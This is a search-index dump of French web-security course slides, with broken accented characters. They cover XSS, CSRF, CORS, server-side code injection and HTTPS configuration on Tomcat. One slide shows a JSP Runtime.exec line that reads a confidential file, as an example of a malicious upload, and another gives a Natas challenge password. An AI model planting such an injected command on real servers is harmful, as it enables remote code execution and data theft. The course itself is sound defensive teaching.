VÃ©rifier les entrÃ©es utilisateurs ! Echapper caractÃ¨res spÃ©ciaux HTML (utiliser au maximum les sÃ©curitÃ©s internes des framework, sinon des fonctions existent dÃ©jÃ  dans les principaux langages, par exemple ${fn:escapeXml(string)} dans une EL en JSP)   SÃ©curitÃ© dÃ©clarative : #  RÃ©sumÃ© des headers Content Security Policy (CSP) Prez Spec (deprecated) X-XSS-Protection   ComplÃ©ments pour la protection des cookies #  Forcer les cookies Ã  Ãªtre \u0026ldquo;secure\u0026rdquo; (utilisable en https uniquement), \u0026ldquo;httpOnly\u0026rdquo; (non utilisable dans les scripts) PrÃ©cision : il s\u0026rsquo;agit de sÃ©curitÃ© dÃ©clarative dont la mise en oeuvre est Ã  la charge du navigateur   Un peu plus de pratique ?? #  Avant de continuer\u0026hellip; # DÃ©couvrons une sÃ©rie challenge disponible sur internet\n Natas 0 (mot de passe de natas0 : natas0) Sur les premiers niveaux, on voit qu\u0026rsquo;une resource cachÃ©e n\u0026rsquo;est jamais cachÃ©e (Digression : robots.txt) et que quelques Ã©lÃ©ments pouvent Ãªtre trÃ¨s facilement manipulÃ©s dans la requÃªte   L\u0026rsquo;injection de code : le retour de la revanche # Quelques niveaux plus tard :\n Natas 12 (mot de passe de natas12 : EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3) Le but est de dÃ©couvrir le mot de passe de natas13 situÃ© dans /etc/natas_webpass/natas13 Hint : passthru est une fonction php permettant d\u0026rsquo;Ã©xÃ©cuter sur le sytÃ¨me du code arbitraire    L\u0026rsquo;injection de code : le retour de la revanche # ExÃ©cution de code sur le serveur\n Mettre un fichier malicieux sur le serveur permettant l\u0026rsquo;Ã©xÃ©cution de code Ã  distance. Ici le code injectÃ© sera du code Ã©xÃ©cutÃ© cÃ´tÃ© serveur (java sur jsp, php)   L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo; #  ExÃ©cution de code sur le serveur au plus prÃ¨s du systÃ¨me Rebond sur le SI possible si :  flux larges entre les diffÃ©rents serveurs compte Ã©xÃ©cutant le code Ã  haut privilÃ¨ge      Nombreuses possibilitÃ©s : aussi bien des traitements dans l\u0026rsquo;application non prÃ©vus que des opÃ©rations directement sur le systÃ¨me d\u0026rsquo;exploitation Par exemple rÃ©ussir Ã  placer sur le serveur une jsp contenant :  \u0026lt;%Runtime.getRuntime().exec(\u0026quot;less /confidentiel/data\u0026quot;);%\u0026gt;   Un langage de programmation lance indirectement des commandes systÃ¨me   SÃ©curitÃ© : #  ContrÃ´ler les entrÃ©es utilisateurs et en particulier pour les fichiers :  le type MIME des entrÃ©es, la cohÃ©rence type attendu et contenu autant que possible l\u0026rsquo;extention de fichier nommÃ© car le serveur et/ou le navigateur peut interprÃ©ter diffÃ©remment un fichier selon son nommage     SÃ©curitÃ© : #  CÃ´tÃ© prod :  \u0026ldquo;chroot\u0026rdquo; des applications ou machines limitÃ© Ã  un traitement utilisateur Ã©xÃ©cutant l\u0026rsquo;application avec droit limitÃ©s (ce n\u0026rsquo;est pas le compte root/admin qui dÃ©marre le tomcat) flux limitÃ©s entre machines     L\u0026rsquo;injection de code : SynthÃ¨se #  Un sujet central : l\u0026rsquo;entrÃ©e untilisateur Mais qu\u0026rsquo;est ce qu\u0026rsquo;une entrÃ©e utilisateur ?   L\u0026rsquo;injection de code # Qu\u0026rsquo;est ce qu\u0026rsquo;une entrÃ©e utilisateur ?\n RequÃªte et ParamÃ¨tres de requÃªte Corps de requÃªte (contenu des requÃªte POST et PUT) : rÃ©ponse Ã  un formulaire, fichier Cookies Entetes HTTP (Authorization, Location, Host, User-Agent, Referrer, Cookies, CORS, \u0026hellip;)   L\u0026rsquo;injection de code # Controle des chaines entrÃ©es et Ã©chappement de tous les caratÃ¨res interprÃ©tables en html, en sql,\u0026hellip; selon la situation.\nUn dÃ©veloppeur web peut se contenter de surveiller ces entrÃ©es mais en rÃ©alitÃ©, les failles peuvent survenir sur n\u0026rsquo;importe quel bit d\u0026rsquo;un Ã©change rÃ©seau.\n Les attaques basÃ©es sur des Ã©changes entre domaines : encore une !! # CSRF (Cross-Site Request Forgery)\n scÃ©nario : Le pirate souhaite effectuer une opÃ©ration en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous Ãªtes authentifiÃ© sur le cible cible, l\u0026rsquo;action s\u0026rsquo;effectue en votre nom. La vulnÃ©rabilitÃ© existe sur les authentifications basÃ©es sur des cookies ou sur des authentifications sso.   DÃ©mo CSRF # https://www.root-me.org/fr/Challenges/Web-Client/CSRF-0-protection\nUn admin regarde vraiment ses messages de temps en temps !\n Protections # ProblÃ©matique :\n On ne cherche pas Ã  empÃ©cher une acton malveillante en soi On cherche Ã  empÃ©cher un utilisateur de faire une opÃ©ration lÃ©gitime mais forcÃ©e par le pirate. On veut s\u0026rsquo;assurer que l\u0026rsquo;utilisateur rÃ©alise son opÃ©ration en pleine conscience.   Protections #  VÃ©rifier les entrÃ©es utilisateurs ? Ici, l\u0026rsquo;action Ã  bloquer est lÃ©gitime\u0026hellip;   Protections #  Faire en sorte qu\u0026rsquo;Ã  chaque appel d\u0026rsquo;un vrai formulaire du site, un jeton Ã  usage unique soit ajoutÃ©. Le serveur pourra ainsi s\u0026rsquo;assurer de la cohÃ©rence de la requÃªte Des bibliothÃ¨ques peuvent aider Ã  cette protection : Spring security, pac4j   Protections #  Il faut alors ajouter dans chaque formulaire le jeton en hidden  \u0026lt;form action=\u0026quot;/monActionAdmin\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Faire l'opÃ©ration sensible\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;${_csrf.parameterName}\u0026quot; value=\u0026quot;${_csrf.token}\u0026quot;/\u0026gt; \u0026lt;/form\u0026gt;   Protections #  Principe tout POST ne contenant pas ce paramÃ¨tre se soldera par une 403 Potentiellement pas nÃ©cessaire sur tout le site Pour lever la protection en spring security:  http.csrf().ignoringAntMatchers(\u0026quot;/saml/**\u0026quot;); // l'ignorer sur certaines url http.csrf().disable(); // l'ignorer complÃ¨tement   CSRF et applis \u0026ldquo;modernes\u0026rdquo; # Frontend JS + Backend Java\n Pas de formulaire cÃ´tÃ© serveur Des requÃªtes isolÃ©e, pas de cookie mais authentification par jeton Si je sers \u0026ldquo;presque\u0026rdquo; le mÃªme service javascript, si l\u0026rsquo;admin se connecte Ã  mon service, je peux lui faire rÃ©aliser toutes les requÃªtes que je souhaite Protection = vÃ©rifier l\u0026rsquo;url oÃ¹ l\u0026rsquo;admin a rÃ©cupÃ©rÃ© le script   La protection CORS # Cross Over Resource Sharing\nScÃ©nario d\u0026rsquo;attaque :\n J\u0026rsquo;arrive sur un site pirate, qui dÃ©clenche un script rÃ©cupÃ©rant une information sur le site cible, par exemple un site interne inaccessible d\u0026rsquo;Internet. L\u0026rsquo;information est ainsi chargÃ©e sur la page et la suite du script peut par exemple la renvoyer au pirate.   Contre-attaque :\n Seul le navigateur sait le site rÃ©el oÃ¹ il a rÃ©cupÃ©rÃ© le site Sur tout navigateur (rÃ©cent), un script Ã©xÃ©cutÃ© par le client et appelant une ressource externe effectuera une vÃ©rification CORS =\u0026gt; La requÃªte ne fonctionnera que si le site externe renvoit un entÃªte Access-Control-Allow-Origin correspond au domaine du site source  Le site dit : voici l\u0026rsquo;url des sites qui peuvent m\u0026rsquo;appeler\n Les navigateurs envoient systÃ©matiquement et automatiquement l\u0026rsquo;entÃªte Origin (Ã  moins d\u0026rsquo;utiliser Netscape 8 ou IE 6)\nLe navigateur n\u0026rsquo;autorise pas la modification de cet entete par script\n La protection CORS #  Pour les requÃªtes GET et POST \u0026ldquo;simple\u0026rdquo;, supposÃ©es sans effets de bord (application/x-www-form-urlencoded,multipart/form-data,text/plain) : la requÃªte est directement envoyÃ©e mais le rÃ©sultat ne s\u0026rsquo;affiche qu\u0026rsquo;en cas de validation de CORS Pour les autres requÃªtes (avec effets de bord), le navigateur envoie prÃ©alablement une requÃªte OPTION, vÃ©rifie CORS, et n\u0026rsquo;exÃ©cute la requÃªte qu\u0026rsquo;en cas de validation !!! Les navigateurs vont maintenant plus loin et font la mÃªme vÃ©rification OPTION pour ces requÃªtes   La protection CORS #  C\u0026rsquo;est donc le serveur qui a la charge de lire l\u0026rsquo;entÃªte Origin, de rÃ©pondre ou non selon le contenu Le serveur DOIT ajouter l\u0026rsquo;entete Access-Control-Allow-Origin en cas de succÃ¨s Par dÃ©faut un serveur ne va bien sÃ»r rien renvoyer et sera donc impossible Ã  appeler par script On peut envisager de renvoyer Access-Control-Allow-Origin: * si le site ne fournit que des donnÃ©es publiques non sensibles   La protection CORS # Domaine au sens CORS :\n Un domaine signifie dans ce contexte un triplet (protocole, nom de domaine, port). http://localhost:8080 n\u0026rsquo;est pas le mÃªme domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore diffÃ©rent   ScÃ©nario CORS #  Un script lance une requÃªte vers un autre domaine que celui oÃ¹ il est exÃ©cutÃ©, typiquement via un XMLHttpRequest(). Le navigateur ajoute l\u0026rsquo;entete Origin Ã  la requÃªte Cet entÃªte n\u0026rsquo;est pas modifiable par script  Origin: https://localhost:8443   ScÃ©nario CORS #  Le serveur recoit la requete et peut contrÃ´ler la prÃ©sence de Origin s\u0026rsquo;il s\u0026rsquo;attend Ã  de telles requÃªtes via script Le serveur possÃ¨de un certain nombre de domaine autorisÃ©s Ã  le contacter par script et potentiellement tous (*)   ScÃ©nario CORS #  Le serveur peut bloquer la requÃªte si elle ne correspond pas Ã  ses domaines autorisÃ©s Si le serveur choisit de rÃ©pondre et qu\u0026rsquo;il est configurÃ© pour, il ajoute un ou plusieurs entÃªtes Access-Control-Allow-Origin :  Access-Control-Allow-Origin: https://localhost:8443 Access-Control-Allow-Origin: http://localhost:8080   S\u0026rsquo;il accepte n\u0026rsquo;importe quel requÃªte issue d\u0026rsquo;un script :  Access-Control-Allow-Origin: *   ScÃ©nario CORS #  Le navigateur lit la rÃ©ponse du serveur Si elle ne contient pas d\u0026rsquo;entÃªte Access-Control-Allow-Origin ou qu\u0026rsquo;aucun entÃªte Access-Control-Allow-Origin ne correspond au domaine source, le navigateur ne retourne rien au script. Le script ne fait pas la difference entre un echec de connexion et une erreur cors   Gestion des erreurs :\n Pour debugger, la console du navigateur vous prÃ©vient que la rÃ©ponse a Ã©tÃ© bloquÃ©e  Test : Test CORS KO\n La protection CORS #  Attention Ã  l\u0026rsquo;autorisation globale (elle peut parfois Ãªtre nÃ©cessaire cependant) : Access-Control-Allow-Origin: * L\u0026rsquo;idÃ©al est de controler cÃ´tÃ© serveur l\u0026rsquo;entete \u0026ldquo;Origin\u0026rdquo; et de personnaliser l\u0026rsquo;entete \u0026ldquo;Access-Control-Allow-Origin\u0026rdquo; si on accepte Le dÃ©tails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS   La protection CORS #  Il faut garder Ã  l\u0026rsquo;esprit que CORS est une sÃ©curitÃ© cÃ´tÃ© client pour l\u0026rsquo;empÃ©cher de faire n\u0026rsquo;importe quoi malgrÃ© lui : fournir Ã  un script une information que le serveur n\u0026rsquo;a pas prÃ©vu d\u0026rsquo;Ãªtre utilisÃ©e par un script.   SynthÃ¨se # Deux grands types de protection\n VÃ©rifier les entrÃ©es utilisateurs ! (SÃ©curitÃ© active) VÃ©rifier que l\u0026rsquo;utilisateur est bien conscient de ses actions :  VÃ©rification d\u0026rsquo;Ã©tat (SÃ©curitÃ© active) Dire au navigateur quelles opÃ©rations sont lÃ©gitimes ou non (SÃ©curitÃ© dÃ©clarative)     S\u0026rsquo;initier aux failles applicatives #  OWASP  Documentation et notamment le OWASP top 10 WebGoat (dÃ©couverte de failles sous forme de cours) Juice Store (challenges)   Natas Root Me  Par ailleurs le CERT-FR est un sytÃ¨me de notification des failles applicatives. Il publie aussi rÃ©guliÃ¨rement des articles de cybersÃ©curitÃ©.\n Surveiller les dÃ©pendances obsolÃ¨tes #  Dependabot (vÃ©rification existance d\u0026rsquo;une nouvelle version) Pour vÃ©rifier vulnÃ©rabilitÃ©s connues : https://owasp.org/www-project-dependency-check/   \u0026ldquo;Le code des autres\u0026rdquo; #  Log4Shell Decembre 2021 https://fr.wikipedia.org/wiki/Log4Shell Voir projet exploit Exploiter avec https://canarytokens.org/generate  "}).add({id:7,href:"/docs/failles/sql/",title:"Injections de code (serveur)",description:"",content:""}).add({id:8,href:"/docs/failles/injection-client/",title:"Injections de code (client)",description:"Encore des injections...",content:""}).add({id:9,href:"/docs/https/fonctionnement/",title:"Fontionnement de https",description:"2 # Mise en place de HTTPS #  Les grands principes # HTTPS intervient dans :\n IntÃ©gritÃ© ConfidentialitÃ© Authentification   Les grands principes #  HTTP protocole purement applicatif \u0026ldquo;Web\u0026rdquo; : toutes donnÃ©es Ã©changÃ©es sont en clair Protocole SSL ou TLS (le nom dÃ©pend de la version) : gestion d\u0026rsquo;un tunnel sÃ©curisÃ© Des protocoles purement fonctionnels (HTTP,FTP,SMTP,\u0026hellip;) peuvent se sÃ©curiser simplement en s\u0026rsquo;Ã©changeant dans un tunnel SSL HTTPS = HTTP + SSL   Proposer HTTPS #  Avoir un listener dÃ©diÃ© au HTTPS (sur le port 443 dans une configuration standard) : le HTTPS est \u0026ldquo;implicite\u0026rdquo; Avoir une configuration HTTPS minimale, soit un couple clÃ© privÃ©e/clÃ© publique   Echange sÃ©curisÃ© #  Les deux parties, client et serveur, doivent se mettre d\u0026rsquo;accord sur une clÃ© symÃ©trique Il existe des mÃ©thode pour communiquer sur un rÃ©seau en clair une clÃ© symÃ©trique secrÃ¨te, qui sera en fait partiellement gÃ©nÃ©rÃ© par les deux parties (Algorithme de Diffie-Hellman) A quoi sert la clÃ© asymÃ©trique alors ?",content:"2 # Mise en place de HTTPS #  Les grands principes # HTTPS intervient dans :\n IntÃ©gritÃ© ConfidentialitÃ© Authentification   Les grands principes #  HTTP protocole purement applicatif \u0026ldquo;Web\u0026rdquo; : toutes donnÃ©es Ã©changÃ©es sont en clair Protocole SSL ou TLS (le nom dÃ©pend de la version) : gestion d\u0026rsquo;un tunnel sÃ©curisÃ© Des protocoles purement fonctionnels (HTTP,FTP,SMTP,\u0026hellip;) peuvent se sÃ©curiser simplement en s\u0026rsquo;Ã©changeant dans un tunnel SSL HTTPS = HTTP + SSL   Proposer HTTPS #  Avoir un listener dÃ©diÃ© au HTTPS (sur le port 443 dans une configuration standard) : le HTTPS est \u0026ldquo;implicite\u0026rdquo; Avoir une configuration HTTPS minimale, soit un couple clÃ© privÃ©e/clÃ© publique   Echange sÃ©curisÃ© #  Les deux parties, client et serveur, doivent se mettre d\u0026rsquo;accord sur une clÃ© symÃ©trique Il existe des mÃ©thode pour communiquer sur un rÃ©seau en clair une clÃ© symÃ©trique secrÃ¨te, qui sera en fait partiellement gÃ©nÃ©rÃ© par les deux parties (Algorithme de Diffie-Hellman) A quoi sert la clÃ© asymÃ©trique alors ? ProblÃ¨me du \u0026ldquo;Man in the middle\u0026rdquo;    ConfidentialitÃ© #  \u0026ldquo;Information invisible par un tiers\u0026rdquo;\u0026hellip; Encore faut il maÃ®triser les deux parties Le client doit savoir qui il est en train de contacter Le serveur propose un certificat contenant principalement son nom : l\u0026rsquo;url que l\u0026rsquo;utilisateur a demandÃ© sa clÃ© publique la signature de ces informations par une autoritÃ© de confiance   AutoritÃ© de confiance ? #  C\u0026rsquo;est un organisme qui signe avec sa clÃ© privÃ©e les informations du serveur On peut donc vÃ©rifier avec la clÃ© publique de l\u0026rsquo;AC si informations et signature correspondent Pour rÃ©cupÃ©rer la clÃ© publique de l\u0026rsquo;AutoritÃ© de confiance, on consulte son\u0026hellip; Certificat ! \u0026hellip; Mais comment vÃ©rifier son certificat ? Le certificat d\u0026rsquo;une AC est autosignÃ©e, le navigateur est configurÃ© pour accepter un certain nombre L\u0026rsquo;insee est une AC reconnue en interne uniquement Les applis Internet sont signÃ©es par une AC externe reconnue dans le monde entier (intÃ©grÃ©e sur les navigateurs connus)   La poignÃ©e de main, ou handshaking #  Le client fait une demande de transaction sÃ©curisÃ©e au serveur Le serveur renvoie son certificat, contenant la clÃ© publique Le client valide le certificat Le client gÃ©nÃ¨re une clÃ© secrÃ¨te qu\u0026rsquo;il chiffre avec la clÃ© publique. La clÃ© secrÃ¨te est envoyÃ©e au serveur Le serveur dÃ©chiffre la clÃ© secrÃ¨te Cette clÃ© est utilisÃ©e pour chiffrer les prochains Ã©changes entre le client et le serveur   La poignÃ©e de main, ou handshaking #  Comment faire en local ? #  Il n\u0026rsquo;est pas nÃ©cessaire d\u0026rsquo;avoir un certificat signÃ© par une autoritÃ© de confiance Un certificat autosignÃ© suffit : c\u0026rsquo;est un certificat \u0026ldquo;localhost\u0026rdquo; signÃ© par \u0026ldquo;localhost\u0026rdquo;   GÃ©nÃ©ration d\u0026rsquo;un certificat autosignÃ© # # On gÃ©nÃ¨re une clÃ© privÃ©e openssl genrsa 2048 \u0026gt; server.key # On gÃ©nÃ¨re la clÃ© publique associÃ© Ã  la clÃ© privÃ©e, et on prÃ©pare la demande de certificat openssl req -new -key server.key -out server.csr \u0026gt; Country Name (2 letter code) [AU]:FR \u0026gt; State or Province Name (full name) [Some-State]:France \u0026gt; Locality Name (eg, city) []:Paris \u0026gt; Organization Name (eg, company) [Internet Widgits Pty Ltd]:Insee \u0026gt; Organizational Unit Name (eg, section) []:CNIP \u0026gt; Common Name (e.g. server FQDN or YOUR name) []:localhost \u0026gt; Email Address []: \u0026gt; Please enter the following 'extra' attributes \u0026gt; to be sent with your certificate request \u0026gt; A challenge password []: \u0026gt; An optional company name []: #On fait signer la demande par l'AC qui ici est localhost lui-mÃªme openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt #Si on veut transformer en keystore openssl pkcs12 -export -in server.crt -inkey server.key -out server.p12 -passout pass:changeit   HTTPS en pratique #  L\u0026rsquo;application ne gÃ¨re pas le HTTPS, c\u0026rsquo;est le serveur applicatif (tomcat) ou un Ã©quipement rÃ©seau supÃ©rieur qui en a la charge L\u0026rsquo;application peut imposer l\u0026rsquo;utilisation du HTTPS   HTTPS en pratique #  Dans tous les cas c\u0026rsquo;est le serveur applicatif (tomcat) qui a la charge de dÃ©terminer si la connexion entrante est sÃ©curisÃ©e Cas direct : c\u0026rsquo;est tomcat qui gÃ¨re lui mÃªme la connexion ssl Cas indirect : tomcat ne gÃ¨re pas de connexion HTTPS mais il sait que la connexion initiale est en HTTPS (cas d\u0026rsquo;un reverse proxy) Si le connecteur gÃ¨re la connexion ssl ou qu\u0026rsquo;il est dÃ©diÃ© Ã  recevoir des connexions sÃ©curisÃ©es, on peut directement le spÃ©cifier sÃ©curisÃ©. Sinon, il va falloir dÃ©finir un profil de requÃªtes sÃ©curisÃ©es   HTTPS indirect en pratique : en production #  Architecture Load Balancer qui porte les certificats (et donc gÃ¨re la connexion HTTPS) Le load balancer dÃ©chiffre et transmet une requÃªte HTTP (en clair) au serveur applicatif portant l\u0026rsquo;application   HTTPS indirect en pratique : en production # Transfert de l\u0026rsquo;information HTTPS\n Pour savoir que la requÃªte initiale est en HTTPS, le load balancer ajoute un entÃªte \u0026ldquo;X-Forwarded-Proto: HTTPS\u0026rdquo;, et on configure Tomcat pour que la lecture de cet entÃªte signifie sÃ©curisÃ©  \u0026lt;Valve className=\u0026quot;org.apache.catalina.connector.RemoteIpValve\u0026quot; protocolHeader=\u0026quot;X-Forwarded-Proto\u0026quot; /\u0026gt;  Une valve Tomcat est une classe exÃ©cutÃ©e (invoke()) Ã  l\u0026rsquo;arrivÃ©e de chaque requÃªte.\n HTTPS direct en pratique : sur localhost # Sur Tomcat\nDans server.xml :\n Ajout d\u0026rsquo;un connecteur SSL  \u0026lt;Connector port=\u0026quot;8443\u0026quot; protocol=\u0026quot;org.apache.coyote.http11.Http11NioProtocol\u0026quot; maxThreads=\u0026quot;150\u0026quot; SSLEnabled=\u0026quot;true\u0026quot; scheme=\u0026quot;https\u0026quot; secure=\u0026quot;true\u0026quot; clientAuth=\u0026quot;false\u0026quot; sslProtocol=\u0026quot;TLS\u0026quot; keystoreFile=\u0026quot;${catalina.home}/conf/ssl/server.p12\u0026quot; keystoreType=\u0026quot;pkcs12\u0026quot; keystorePass=\u0026quot;changeit\u0026quot; /\u0026gt;   HTTPS direct en pratique # Sur Tomcat\nDans server.xml\n DÃ©finition du port de redirection dans le cas d\u0026rsquo;un connecteur non sÃ©curisÃ©  \u0026lt;Connector connectionTimeout=\u0026quot;20000\u0026quot; port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; redirectPort=\u0026quot;8443\u0026quot;/\u0026gt;   Sur l\u0026rsquo;appli, pour indiquer qu\u0026rsquo;on impose du https # web.xml (Tomcat)\n\u0026lt;security-constraint\u0026gt; \u0026lt;display-name\u0026gt;tout-en-https\u0026lt;/display-name\u0026gt; \u0026lt;web-resource-collection\u0026gt; \u0026lt;web-resource-name\u0026gt;tout\u0026lt;/web-resource-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/web-resource-collection\u0026gt; \u0026lt;user-data-constraint\u0026gt; \u0026lt;transport-guarantee\u0026gt;CONFIDENTIAL\u0026lt;/transport-guarantee\u0026gt; \u0026lt;/user-data-constraint\u0026gt; \u0026lt;/security-constraint\u0026gt;   Sur l\u0026rsquo;appli, pour indiquer qu\u0026rsquo;on impose du https # Spring Security\n@Configuration @EnableWebSecurity public class SpringSecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.requiresChannel().antMatchers(\u0026quot;/**\u0026quot;).requiresSecure(); } }   TP #  GÃ©nÃ©rer un keystore pour une configuration https de localhost Mettre en place https sur un serveur local Forcer le https sur l\u0026rsquo;application   Vraiment forcer le HTTPS #  Niveau applicatif pour controle Ã©ventuellement Niveau Frontal (Load Balancer) : Ã©couter en http sur le port 80 mais uniquement pour rediriger vers https DÃ©claratif Indiquer au navigateur de ne plsu utiliser que HTTPS : en-tÃªte HSTS  Strict-Transport-Security \u0026quot;max-age=31536000\u0026quot;   Le truststore #  Mon application doit se connecter Ã  une autre application (web-service) Je souhaite que cet appel soit en https (au fond justifiÃ© que si la connexion entre les deux serveurs passent par Internet) Lors d\u0026rsquo;une connexion HTTPS, Java vÃ©rifie si le certificat distant est valide C\u0026rsquo;est ce que fait le navigateur quand on se connecte Ã  un site Si le certificat n\u0026rsquo;est pas valide (expirÃ©, non associÃ© au domaine, non signÃ© par une autoritÃ© de confiance), le navigateur me le signale et je choisit de prendre le risque ou non de me connecter au site. Dans l\u0026rsquo;appli, Java refusera systÃ©matiquement la connexion   Le truststore #  Date d\u0026rsquo;expiration, mauvais nom : je ne peux rien faire, il faut que le certificat soit cohÃ©rent AutosignÃ© ? Je peux dire Ã  Java que le signataire du certificat est valide, en d\u0026rsquo;autres termes, je lui dÃ©finis une autoritÃ© de confiance (Il existe la possibilitÃ© de crÃ©er une classe faisant que Java ne fait plus aucun contrÃ´le sur le certificat mais c\u0026rsquo;est mal) Il faut crÃ©er un truststore contenant l\u0026rsquo;ensemble des certificats Ã  valider (= ce que l\u0026rsquo;on considÃ¨re AC)   Le truststore #  Par dÃ©faut le trustore chargÃ© est celui de la jvm Ã©xÃ©cutant l\u0026rsquo;application (\u0026hellip;.\\mon-jdk\\lib\\security\\cacerts) Le mot de passe par dÃ©faut est changeit On peut vouloir un \u0026ldquo;Insee flavored cacert\u0026rdquo; : le cacerts disponible dans la distribution java plus la chaine de certification Insee (AC Racine + AC SubordonnÃ©e) Au cas oÃ¹ : certificats AC Insee   Le truststore #  Pour le changer on utilise des paramÃ¨tres de la JVM :  javax.net.ssl.trustStrore javax.net.ssl.trustStorePassword javax.net.ssl.trustStoreType (par dÃ©faut jks)   On crÃ©e un nouveau truststore, en pratique on ajoute nos certificats au truststore par dÃ©faut   Le truststore #  CrÃ©er le truststore  keytool -import -trustcacerts -file server.crt -alias localhost -keystore cacertsperso  Si keytool inconnu : (Ã  ajouter au path pour plus de simplicitÃ©)\n\u0026quot;path/to/mon-jdk/bin/keytool.exe\u0026quot; \u0026quot;$JAVA_HOME/bin/keytool.exe\u0026quot;  CrÃ©e le truststore si cacertsperso n\u0026rsquo;existe pas encore, ajoute le certificat aux existants s\u0026rsquo;il existe dÃ©jÃ \n Le truststore #  Le dÃ©clarer au dÃ©marrage :  ParamÃ¨tres de dÃ©marrage    -Djavax.net.ssl.trustStore=\u0026quot;/path/to/cacerts.jks\u0026quot; -Djavax.net.ssl.trustStorePassword=changeit -Djavax.net.ssl.trustStoreType=JKS -Djavax.net.debug=all (UNIQUEMENT pour debugger en cas de problÃ¨me, c'est TRES verbeux)   Dans le code :  System.setProperty(\u0026quot;javax.net.ssl.trustStore\u0026quot;, \u0026quot;/path/to/cacerts.jks\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStorePassword\u0026quot;, \u0026quot;changeit\u0026quot;); System.setProperty(\u0026quot;javax.net.ssl.trustStoreType\u0026quot;, \u0026quot;JKS\u0026quot;);   TP #  CrÃ©er un truststore incluant le cacert Insee et le certificat gÃ©nÃ©rÃ© prÃ©cÃ©demment Le faire prendre en compte dans l\u0026rsquo;application   Https sur les application javascript #  Fonctionnement proche : rÃ©alisÃ© par le F5 en prod, par l\u0026rsquo;apache en dv/qf (mais il n\u0026rsquo;y a pas de tomcat) L\u0026rsquo;application s\u0026rsquo;Ã©xÃ©cute chez le client, pour forcer le https, il faut donc raisonner cÃ´tÃ© client Si l\u0026rsquo;application JS veut s\u0026rsquo;assurer de passer en HTTPS, elle doit vÃ©rifier le window.location du client et Ã©ventuellement le rediriger.   Https sur les application javascript # if ( typeof window !== 'undefined' \u0026amp;\u0026amp; window.location \u0026amp;\u0026amp; window.location.protocol === 'http:' ) { window.location.href = window.location.href.replace( /^http(?!s)/, 'https' ); }   Https sur les application javascript : dÃ©veloppement # Pour lancer une application \u0026ldquo;create-react-app\u0026rdquo; en https en local (par defaut http) :\n Au lieu de npm start Lancer set HTTPS=true\u0026amp;\u0026amp;npm start   Https sur les application javascript : cas du back-end mal signÃ© # Un front-end JavaScript effectue des appels Ã  son backend.\nDans la pratique, c\u0026rsquo;est le navigateur qui effectue ces requetes, et si le certificat du backend ne convient pas au navigateur, la requete va Ãªtre rejetÃ©e.\n Solution 1 : Faire en sort que le backend ait un certificat signÃ© par l\u0026rsquo;Insee Solution 2 : se connecter manuellement une fois au backend, accepter l\u0026rsquo;alerte de sÃ©curitÃ© du navigateur  "}).add({id:10,href:"/docs/https/pratique/",title:"Mise en pratique de https",description:"GÃ©nÃ©rer un certificat # Les Ã©tapes :\n GÃ©nÃ©rer une clÃ© privÃ©e Calculer la clÃ© publique Ã  partir de la clÃ© privÃ©e Enrober la clÃ© publique dans une demande de certificat Signer la demande de certificat (facultatif) GÃ©nÃ©rer le bon format d\u0026rsquo;Ã©change  Qui signe ?\n Une autoritÃ© payante Let\u0026rsquo;s encrypt Nous-mÃªme dans le cadre de l\u0026rsquo;exercice ! Certifcat dit autosignÃ©, ici gÃ©nÃ©rÃ© pour localhost, signÃ© par localhost  # On gÃ©nÃ¨re une clÃ© privÃ©e openssl genrsa 2048 \u0026gt; server.",content:"GÃ©nÃ©rer un certificat # Les Ã©tapes :\n GÃ©nÃ©rer une clÃ© privÃ©e Calculer la clÃ© publique Ã  partir de la clÃ© privÃ©e Enrober la clÃ© publique dans une demande de certificat Signer la demande de certificat (facultatif) GÃ©nÃ©rer le bon format d\u0026rsquo;Ã©change  Qui signe ?\n Une autoritÃ© payante Let\u0026rsquo;s encrypt Nous-mÃªme dans le cadre de l\u0026rsquo;exercice ! Certifcat dit autosignÃ©, ici gÃ©nÃ©rÃ© pour localhost, signÃ© par localhost  # On gÃ©nÃ¨re une clÃ© privÃ©e openssl genrsa 2048 \u0026gt; server.key  # On gÃ©nÃ¨re la clÃ© publique associÃ© Ã  la clÃ© privÃ©e, et on prÃ©pare la demande de certificat openssl req -new -key server.key -out server.csr  \u0026gt; Country Name (2 letter code) [AU]:FR \u0026gt; State or Province Name (full name) [Some-State]:France \u0026gt; Locality Name (eg, city) []:Paris \u0026gt; Organization Name (eg, company) [Internet Widgits Pty Ltd]:Insee \u0026gt; Organizational Unit Name (eg, section) []:CNIP \u0026gt; Common Name (e.g. server FQDN or YOUR name) []:localhost \u0026gt; Email Address []: \u0026gt; Please enter the following 'extra' attributes \u0026gt; to be sent with your certificate request \u0026gt; A challenge password []: \u0026gt; An optional company name []:  # On fait signer la demande par l'AC qui ici est localhost lui-mÃªme openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt  # Si on veut transformer en keystore openssl pkcs12 -export -in server.crt -inkey server.key -out server.p12 -passout pass:changeit  Installation sur tomcat # Configuration des ports d\u0026rsquo;Ã©coute : dans le server.xml :\nAjout d\u0026rsquo;un connecteur SSL # \u0026lt;Connector port=\u0026quot;8443\u0026quot; protocol=\u0026quot;org.apache.coyote.http11.Http11NioProtocol\u0026quot; maxThreads=\u0026quot;150\u0026quot; SSLEnabled=\u0026quot;true\u0026quot; scheme=\u0026quot;https\u0026quot; secure=\u0026quot;true\u0026quot; clientAuth=\u0026quot;false\u0026quot; sslProtocol=\u0026quot;TLS\u0026quot; keystoreFile=\u0026quot;${catalina.home}/conf/ssl/server.p12\u0026quot; keystoreType=\u0026quot;pkcs12\u0026quot; keystorePass=\u0026quot;changeit\u0026quot; /\u0026gt;  Configuration de la redirection du connecteur par dÃ©faut # On dÃ©finie le port de redirection dans le cas ou une redirection https est 